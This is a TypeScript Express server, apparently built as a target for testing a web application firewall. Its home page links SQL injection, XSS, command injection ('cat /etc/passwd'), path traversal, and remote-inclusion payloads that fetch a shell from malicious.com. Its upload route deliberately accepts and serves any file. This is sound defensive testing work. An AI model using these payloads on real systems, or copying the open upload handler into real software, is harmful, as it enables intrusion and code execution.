import express from 'express';
import multer from 'multer';
import path from 'path';
import fs from 'fs';

const app = express();
const PORT = process.env.PORT || 4000;

// 업로드 디렉토리 생성
const uploadDir = path.join(__dirname, '..', 'uploads');
if (!fs.existsSync(uploadDir)) {
  fs.mkdirSync(uploadDir, { recursive: true });
}

// Multer 설정 - 파일 저장 설정
const storage = multer.diskStorage({
  destination: (req, file, cb) => {
    cb(null, uploadDir);
  },
  filename: (req, file, cb) => {
    // 원본 파일명 + 타임스탬프
    const ext = path.extname(file.originalname);
    const name = path.basename(file.originalname, ext);
    cb(null, `${name}_${Date.now()}${ext}`);
  },
});

// WAF에서 악성 파일 차단을 처리하므로 여기서는 모든 파일 허용

const upload = multer({
  storage: storage,
  limits: {
    fileSize: 10 * 1024 * 1024, // 10MB 제한
  },
});

// JSON 파싱 미들웨어
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// 정적 파일 서빙
app.use('/uploads', express.static(uploadDir));

// 메인 페이지 - 파일 업로드 폼
app.get('/', (req, res) => {
  const html = `
<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Tenant Example</title>
    <style>
        body { 
            font-family: Arial, sans-serif; 
            max-width: 800px; 
            margin: 0 auto; 
            padding: 20px; 
        }
        .upload-form { 
            border: 1px solid #ddd; 
            padding: 20px; 
            border-radius: 5px; 
            margin-bottom: 20px; 
        }
        .result { 
            margin-top: 20px; 
            padding: 10px; 
            border-radius: 5px; 
        }
        .success { background-color: #d4edda; border: 1px solid #c3e6cb; }
        .error { background-color: #f8d7da; border: 1px solid #f5c6cb; }
        .attack-test {
            background-color: #fff3cd;
            border: 1px solid #ffeaa7;
            padding: 15px;
            border-radius: 5px;
            margin-top: 20px;
        }
        .attack-test h3 {
            color: #856404;
            margin-top: 15px;
            margin-bottom: 8px;
        }
        .attack-test ul {
            margin-bottom: 15px;
        }
        .attack-test a {
            color: #dc3545;
            text-decoration: none;
        }
        .attack-test a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <h1>Tenant Example (WAF 테스트용)</h1>
    
      <div class="attack-test">
          <h2>WAF 공격 차단 테스트</h2>
          <p>아래 링크들을 클릭하면 WAF에서 차단되어야 합니다:</p>
          
          <h3>SQL Injection 테스트</h3>
          <ul>
              <li><a href="http://waf-tenant.kro.kr/?q=' OR '1'='1" target="_blank">SQL Injection #1: ' OR '1'='1</a></li>
              <li><a href="http://waf-tenant.kro.kr/?id=1 UNION SELECT * FROM users--" target="_blank">SQL Injection #2: UNION SELECT</a></li>
          </ul>

          <h3>Reflected XSS 테스트</h3>
          <ul>
              <li><a href="http://waf-tenant.kro.kr/?q=<script>alert(1)</script>" target="_blank">XSS #1: Basic Script Tag</a></li>
              <li><a href="http://waf-tenant.kro.kr/?search=<img src=x onerror=alert('XSS')>" target="_blank">XSS #2: Image Tag with onerror</a></li>
          </ul>

          <h3>Command Injection 테스트</h3>
          <ul>
              <li><a href="http://waf-tenant.kro.kr/?cmd=; ls -la" target="_blank">Command Injection #1: ; ls -la</a></li>
              <li><a href="http://waf-tenant.kro.kr/?exec=&& cat /etc/passwd" target="_blank">Command Injection #2: && cat /etc/passwd</a></li>
          </ul>

          <h3>LFI/RFI & 경로조작 테스트</h3>
          <ul>
              <li><a href="http://waf-tenant.kro.kr/?file=../../../etc/passwd" target="_blank">LFI #1: ../../../etc/passwd</a></li>
              <li><a href="http://waf-tenant.kro.kr/?include=http://malicious.com/shell.php" target="_blank">RFI #2: Remote File Inclusion</a></li>
          </ul>
      </div>

      <div class="upload-form">
        <h2>파일 업로드 테스트</h2>
        <form action="/upload" method="post" enctype="multipart/form-data">
            <input type="file" name="file" required>
            <button type="submit">업로드</button>
        </form>
      </div>

      <h3>업로드된 파일 목록</h3>
      <div id="fileList">
          <a href="/files">파일 목록 보기</a>
      </div>
</body>
</html>
  `;
  res.send(html);
});

// 파일 업로드 엔드포인트
app.post('/upload', upload.single('file'), (req, res) => {
  try {
    if (!req.file) {
      return res.status(400).json({ error: '파일이 선택되지 않았습니다.' });
    }

    console.log('파일 업로드 성공:', req.file);
    res.json({
      message: '파일 업로드 성공!',
      filename: req.file.filename,
      originalname: req.file.originalname,
      size: req.file.size,
      path: `/uploads/${req.file.filename}`,
    });
  } catch (error) {
    console.error('파일 업로드 에러:', error);
    res.status(500).json({ error: '파일 업로드 실패' });
  }
});

// 업로드 에러 핸들링
app.use((error: any, req: any, res: any, next: any) => {
  if (error instanceof multer.MulterError) {
    if (error.code === 'LIMIT_FILE_SIZE') {
      return res
        .status(400)
        .json({ error: '파일 크기가 너무 큽니다. (최대 10MB)' });
    }
  }

  res.status(500).json({ error: '서버 에러가 발생했습니다.' });
});

// 업로드된 파일 목록 조회
app.get('/files', (req, res) => {
  try {
    const files = fs.readdirSync(uploadDir);
    const fileList = files.map((filename) => {
      const filePath = path.join(uploadDir, filename);
      const stats = fs.statSync(filePath);
      return {
        filename,
        size: stats.size,
        uploadDate: stats.birthtime,
        url: `/uploads/${filename}`,
      };
    });

    res.json({ files: fileList });
  } catch (error) {
    res.status(500).json({ error: '파일 목록을 불러올 수 없습니다.' });
  }
});

// 서버 시작
app.listen(PORT, () => {
  console.log(`Server on: http://localhost:${PORT}`);
  console.log(`파일 업로드 테스트: http://localhost:${PORT}`);
  console.log(`업로드 디렉토리: ${uploadDir}`);
});

export default app;
